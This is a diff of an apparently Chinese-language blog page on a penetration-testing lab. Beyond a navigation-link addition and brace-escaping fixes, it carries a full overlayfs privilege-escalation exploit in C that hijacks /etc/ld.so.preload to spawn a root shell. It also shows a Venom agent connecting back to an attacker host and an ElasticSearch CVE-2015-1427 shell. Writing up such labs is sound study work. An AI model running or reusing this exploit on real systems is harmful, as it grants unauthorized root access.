@@ -85,6 +85,8 @@
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
        --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
      -->
       </ul>
     </span>
@@ -469,7 +471,7 @@ Venom Admin Node Start<span class="token punctuation">..</span>.
          ░░    ░     ░   ░ ░░ ░ ░ ▒ ░      ░                               
           ░    ░  ░        ░    ░ ░        ░                               
          ░                                                                 
-               <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; v1.1 author: Dlive &amp;#125; </span>
+               <span class="token punctuation">{</span> v1.1 author: Dlive <span class="token punctuation">}</span> 
 </code></pre>
 <p>目标机连接kali：</p>
 <pre class=" language-bash"><code class="language-bash">/app <span class="token comment" spellcheck="true"># ./agent_linux_x64 -rhost 192.168.64.128 -rport 2333</span>
@@ -560,7 +562,7 @@ Shellcodes: No Results
    ░  ░    ░  ░     ░  ░      ░            ░  ░ ░            ░   ░  ░  ░   ░  ░    ░  ░    ░  ░                                                            
                                               ░                                                                                                            
  Exploit <span class="token keyword">for</span> ElasticSearch , CVE-2015-1427   Version: 20150309.1                                                                                           
-<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;*&amp;#125; Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something</span>
+<span class="token punctuation">{</span>*<span class="token punctuation">}</span> Spawning Shell on target<span class="token punctuation">..</span>. Do note, its only semi-interactive<span class="token punctuation">..</span>. Use it to drop a better payload or something
 ~$ <span class="token function">ls</span>
 <span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  192.168.64.128:10001  <span class="token punctuation">..</span>.  172.17.0.3:9200  <span class="token punctuation">..</span>.  OK
 bin
@@ -798,13 +800,13 @@ greets to beist &amp; kaliman
 <span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 <span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/sched.h></span></span>
 
-<span class="token macro property">#<span class="token directive keyword">define</span> LIB "#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&amp;#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \"/bin/su\")) &amp;#123;\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n&amp;#125;\n    return _real_getuid();\n&amp;#125;\n"</span>
+<span class="token macro property">#<span class="token directive keyword">define</span> LIB "#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"</span>
 
 <span class="token keyword">static</span> <span class="token keyword">char</span> child_stack<span class="token punctuation">[</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
 <span class="token keyword">static</span> <span class="token keyword">int</span>
 <span class="token function">child_exec</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>stuff<span class="token punctuation">)</span>
-<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token punctuation">{</span>
     <span class="token keyword">char</span> <span class="token operator">*</span>file<span class="token punctuation">;</span>
     <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /tmp/ns_sploit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">"/tmp/ns_sploit"</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -813,15 +815,15 @@ greets to beist &amp; kaliman
     <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token string">"mount #1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">"overlay"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">,</span> <span class="token string">"overlayfs"</span><span class="token punctuation">,</span> MS_MGC_VAL<span class="token punctuation">,</span> <span class="token string">"lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">"overlay"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">,</span> <span class="token string">"overlayfs"</span><span class="token punctuation">,</span> MS_MGC_VAL<span class="token punctuation">,</span> <span class="token string">"lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token comment" spellcheck="true">// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">"overlay"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">,</span> <span class="token string">"overlay"</span><span class="token punctuation">,</span> MS_MGC_VAL<span class="token punctuation">,</span> <span class="token string">"lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">"overlay"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">,</span> <span class="token string">"overlay"</span><span class="token punctuation">,</span> MS_MGC_VAL<span class="token punctuation">,</span> <span class="token string">"lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"no FS_USERNS_MOUNT for overlayfs on this kernel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
         file <span class="token operator">=</span> <span class="token string">".access"</span><span class="token punctuation">;</span>
         <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/tmp/ns_sploit/work/work"</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> file <span class="token operator">=</span> <span class="token string">"ns_last_pid"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> file <span class="token operator">=</span> <span class="token string">"ns_last_pid"</span><span class="token punctuation">;</span>
 
     <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">rename</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token string">"ld.so.preload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -829,45 +831,45 @@ greets to beist &amp; kaliman
     <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">umount</span><span class="token punctuation">(</span><span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token string">"mount #2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">"overlay"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">,</span> <span class="token string">"overlayfs"</span><span class="token punctuation">,</span> MS_MGC_VAL<span class="token punctuation">,</span> <span class="token string">"lowerdir=/tmp/ns_sploit/upper,upperdir=/etc"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">"overlay"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">,</span> <span class="token string">"overlay"</span><span class="token punctuation">,</span> MS_MGC_VAL<span class="token punctuation">,</span> <span class="token string">"lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">"overlay"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">,</span> <span class="token string">"overlayfs"</span><span class="token punctuation">,</span> MS_MGC_VAL<span class="token punctuation">,</span> <span class="token string">"lowerdir=/tmp/ns_sploit/upper,upperdir=/etc"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">"overlay"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">,</span> <span class="token string">"overlay"</span><span class="token punctuation">,</span> MS_MGC_VAL<span class="token punctuation">,</span> <span class="token string">"lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
         <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/tmp/ns_sploit/work/work"</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
     <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/tmp/ns_sploit/o/ld.so.preload"</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">umount</span><span class="token punctuation">(</span><span class="token string">"/tmp/ns_sploit/o"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
 <span class="token keyword">int</span>
 <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
-<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token punctuation">{</span>
     <span class="token keyword">int</span> status<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> lib<span class="token punctuation">;</span>
     pid_t wrapper<span class="token punctuation">,</span> init<span class="token punctuation">;</span>
     <span class="token keyword">int</span> clone_flags <span class="token operator">=</span> CLONE_NEWNS <span class="token operator">|</span> SIGCHLD<span class="token punctuation">;</span>
 
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token string">"spawning threads\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>wrapper <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>wrapper <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">unshare</span><span class="token punctuation">(</span>CLONE_NEWUSER<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
             <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"failed to create new user namespace\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>init <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>init <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             pid_t pid <span class="token operator">=</span>
                 <span class="token function">clone</span><span class="token punctuation">(</span>child_exec<span class="token punctuation">,</span> child_stack <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">,</span> clone_flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"failed to create new mount namespace\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
 
             <span class="token function">waitpid</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
 
         <span class="token function">waitpid</span><span class="token punctuation">(</span>init<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
     <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">300000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -877,10 +879,10 @@ greets to beist &amp; kaliman
 
     fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/etc/ld.so.preload"</span><span class="token punctuation">,</span>O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">if</span><span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token string">"exploit failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token string">"/etc/ld.so.preload created\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token string">"creating shared library\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -890,16 +892,16 @@ greets to beist &amp; kaliman
     write(lib,LIB,strlen(LIB));
     close(lib);
     lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
-    if(lib != 0) &amp;#123;
+    if(lib != 0) {
         fprintf(stderr,"couldn't create dynamic library\n");
         exit(-1);
-    &amp;#125;
+    }
     write(fd,"/tmp/ofs-lib.so\n",16);
     */</span>
     <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /tmp/ns_sploit /tmp/ofs-lib.c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/su"</span><span class="token punctuation">,</span><span class="token string">"su"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>因为目标环境没有gcc编译器，所以凡是内容涉及到编译的都要想办法解决，这里就是直接拷贝他需要的so文件到它的&#x2F;tmp目录下面，并且在本地编译好exp后上传</p>
 <p>先定位需要的so文件</p>
@@ -995,6 +997,8 @@ warranty<span class="token punctuation">;</span> not even <span class="token key
         
           <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
         
+          <li><a href="/search/">搜索</a></li>
+        
       </ul>
     </div>
 
@@ -1056,6 +1060,8 @@ warranty<span class="token punctuation">;</span> not even <span class="token key
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    --><!--
+      --><li><a href="/search/">搜索</a></li><!--
     -->
       </ul>
       <ul>
